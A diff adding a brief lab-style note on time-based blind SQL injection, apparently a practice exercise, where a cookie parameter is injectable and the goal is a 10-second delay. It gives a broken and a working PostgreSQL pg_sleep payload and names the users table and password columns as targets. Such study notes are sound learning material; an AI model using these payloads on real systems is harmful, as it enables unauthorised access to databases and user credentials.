@@ -1,0 +1,17 @@
+Perform a SQLi with time delay
+
+info:
+    - users table
+    - password columns
+    - username columns
+    - The cookie id is the vulnerable parameter
+
+Objective Make a query delayed by 10s
+
+-------------------------------------------------------------
+
+STEP1: Prove that the parameter is vuln to SQli (time base)
+
+BAD payload : '||(SELECT+pg_sleep(10))'--
+GOOD payload: '||(SELECT+pg_sleep(10))--
+
